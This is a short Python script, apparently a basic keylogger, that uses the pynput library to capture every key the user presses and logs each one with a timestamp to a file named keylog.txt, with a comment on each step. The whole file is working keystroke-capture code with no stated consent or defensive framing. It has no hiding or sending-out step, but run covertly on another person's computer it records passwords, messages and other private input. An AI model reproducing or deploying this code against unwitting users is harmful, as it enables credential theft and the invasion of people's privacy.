from pynput.keyboard import Key, Listener
# Reads keystrokes as user is typing them
import logging
# Logs keystrokes into a file
 
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
# Logs keystrokes into a .txt file in the format: YY-MM-DD HH-MM-SS(ms) - Key
 
def on_press(key):
    logging.info(str(key))
# Function that takes key press, converts it to a string, then logs it into the file
 
with Listener(on_press=on_press) as listener :
    listener.join()
# Upon key press, activates Listener that calls the above function